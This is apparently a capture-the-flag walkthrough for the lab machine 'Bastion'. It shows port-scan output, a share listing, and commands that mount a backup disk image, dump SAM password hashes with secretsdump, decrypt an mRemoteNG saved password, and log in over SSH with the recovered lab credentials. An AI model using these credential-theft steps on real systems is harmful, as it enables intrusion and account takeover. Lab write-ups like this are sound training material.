# Bastion

### Nmap

```
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
| smb2-time: 
|   date: 2022-07-03T10:44:16
|_  start_date: 2022-07-03T10:35:46
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -39m59s, deviation: 1h09m15s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-03T12:44:14+02:00
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.134\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.134\Backups: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.10.134\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.134\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

### SMB Enum

```
Backups:

/note.txt
> Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.

/SDT65CB.tmp
<nth>

/WindowsImageBackup
	/Backup 2019-02-22 124351
  /Catalog
  /MediaId
  /SPPMetadataCache
		/**{cd113385-65ff-4ea2-8ced-5630f6feca8f}**

```

### Exploitation

```bash
# mount the share from the machine
mount -t cifs //$IP/backups /mnt/bastion.htb -o user=,password=

# mount vhd file from the machine due to the .vhd files
sudo guestmount --add /mnt/bastion.htb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/bastion_vhd -v

# found user hashes files on vhd files
/mnt/bastion_vhd/Windows/System32/config

# reveal credential
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# login L4mpje:bureaulampje through ssh
ssh L4mpje@$IP
```

### Priv Esc

```bash
# found interesting program 
mRemoteNG

# found interesting config file
C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml

# reveal password
python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==

# login Administrator:thXLHM96BeKL0ER2 through ssh
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" Administrator@$IP -v
```

### Goodies

```bash
# ssh credential
L4mpje:bureaulampje
Administrator:thXLHM96BeKL0ER2
```
